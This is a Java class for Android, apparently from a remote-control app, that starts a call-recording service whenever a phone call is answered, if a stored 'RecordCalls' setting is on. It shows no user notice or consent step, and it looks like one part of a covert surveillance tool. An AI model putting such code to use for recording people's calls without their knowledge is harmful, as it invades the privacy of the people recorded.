package com.remote.app.Managers.Calls;

import android.content.Intent;
import android.content.Context;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.telephony.PhoneStateListener;
import android.util.Log;

public class PhoneListener extends PhoneStateListener
{
    private Context context;

    public PhoneListener(Context c) {
        context = c;
    }

    public void onCallStateChanged (int state, String incomingNumber)
    {
        switch (state) {
        case TelephonyManager.CALL_STATE_IDLE:
            Boolean stopped = context.stopService(new Intent(context, RecordService.class));
            
            break;
        case TelephonyManager.CALL_STATE_RINGING:
            break;
        case TelephonyManager.CALL_STATE_OFFHOOK:
	        if(context.getSharedPreferences("settings", Context.MODE_PRIVATE).getBoolean("RecordCalls",false))
	        {
	            Intent callIntent = new Intent(context, RecordService.class);
	            //callIntent.putExtra("incomingNumber",incomingNumber);
	            ComponentName name = context.startService(callIntent);
	            if (null == name) {
	            } else {
	            }
	        }
            break;
        }
    }
}
